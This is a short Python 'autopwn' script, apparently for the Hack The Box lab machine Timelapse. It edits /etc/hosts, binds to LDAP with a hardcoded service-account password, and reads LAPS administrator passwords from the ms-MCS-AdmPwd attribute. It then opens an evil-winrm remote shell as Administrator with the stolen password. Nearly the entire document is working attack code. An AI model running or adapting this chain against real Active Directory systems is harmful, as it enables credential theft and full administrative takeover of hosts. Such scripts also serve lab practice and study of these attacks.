from ldap3 import ALL, Server, Connection, NTLM, SUBTREE, extend
import os

print("\n[\033[1;32m+\033[1;37m] Autopwn Timelapse ~ GatoGamer1155")
os.system("echo '10.10.11.152 timelapse.htb' >> /etc/hosts")

def base(domain):
    search_base = ""
    base = domain.split(".")
    for b in base:
        search_base += "DC=" + b + ","
    return search_base[:-1]

s = Server("timelapse.htb", get_info=ALL)
c = Connection(s, user="timelapse.htb\\svc_deploy", password="E3R$Q62^12p7PLlC%KWaxuaV", authentication=NTLM, auto_bind=True)
c.search(search_base=base("timelapse.htb"), search_filter='(&(objectCategory=computer)(ms-MCS-AdmPwd=*))',attributes=['ms-MCS-AdmPwd','SAMAccountname'])
for entry in c.entries:
    password = str(entry['ms-Mcs-AdmPwd'])

os.system(f"evil-winrm -S -i 10.10.11.152 -u Administrator -p '{password}'")
